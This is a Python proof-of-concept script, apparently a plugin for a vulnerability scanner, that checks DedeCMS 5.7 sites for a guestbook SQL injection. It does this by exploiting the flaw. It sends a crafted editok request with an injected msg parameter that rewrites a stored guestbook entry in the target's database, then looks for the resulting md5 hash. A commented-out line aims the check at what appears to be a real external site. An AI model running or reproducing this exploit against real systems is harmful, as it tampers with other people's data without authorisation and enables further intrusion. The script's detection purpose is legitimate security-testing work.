#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
#__author__ = 'ifk' 
#Refer http://www.shangxueba.com/jingyan/2190419.html
import re
import requests

def assign(service, arg): 
    if service == "dedecms": 
        return True, arg 
		
def audit(arg):
    url = '/plus/guestbook.php'
    req = requests.get(arg + url, timeout=5)
    if req.status_code == 200:
        m = re.search(r'admin&id=(\d+)', req.text)
        if m:
            a = m.group(1)
            payload1 = '/plus/guestbook.php?action=admin&job=editok&id='
            payload2 = "&msg=%27,msg=md5(3.14),email=%27"
            payload = payload1 + a + payload2
            verify_url = arg + payload
            requests.get(verify_url, timeout=5)
            req2 = requests.get(arg+url)
            if req2.status_code == 200 and '4beed3b9c4a886067de0e3a094246f78' in req2.text:
                return 'dedecms5.7 guestbook SQLinjection on %s' % url

# if __name__ == '__main__': 
#     from dummy import *
#     audit(assign('dedecms', 'http://www.jxsrmyy.cn/')[1])


class Exploit(object):

    def attack(self, url):
        return audit(url)